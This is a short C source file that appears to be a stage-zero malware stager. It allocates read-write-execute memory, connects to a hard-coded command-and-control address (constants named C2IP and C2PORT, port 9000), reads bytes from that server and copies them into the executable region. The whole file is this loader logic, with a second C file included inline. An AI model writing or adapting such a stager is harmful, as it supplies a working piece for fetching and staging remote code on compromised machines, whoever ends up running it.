#include "syscall.h"

#define STAGE 0
#define SIZE 0x4000
#define PROTECTION (PROT_EXEC | PROT_READ | PROT_WRITE)
#define FLAGS (MAP_ANON|MAP_COPY)

#define C2PORT 9000
#define C2IP 0x020011ac  // Because conversions are hard

int main() {
    // And now you can code in C
    char * mem = mmap(STAGE, SIZE, PROTECTION, FLAGS, -1, 0);
    char buf[64] = {0};

    struct in_addr server_ip = { C2IP };
    struct sockaddr_in server = {
        AF_INET, htons(C2PORT), server_ip
    };
    char msg[] = "Hello, world\n";

    int socket_fd = 0, errno = 0;

    socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_fd == 0) {
        exit(2);
    }

    errno = connect(socket_fd, (struct sockaddr *)&server, sizeof(server));
    if (errno < 0) {
        exit(errno);
    }

    read(socket_fd, buf, 16);
    memcpy(mem, buf, 16);

    close(socket_fd);
    #include "syscall.c"
    return errno;
}
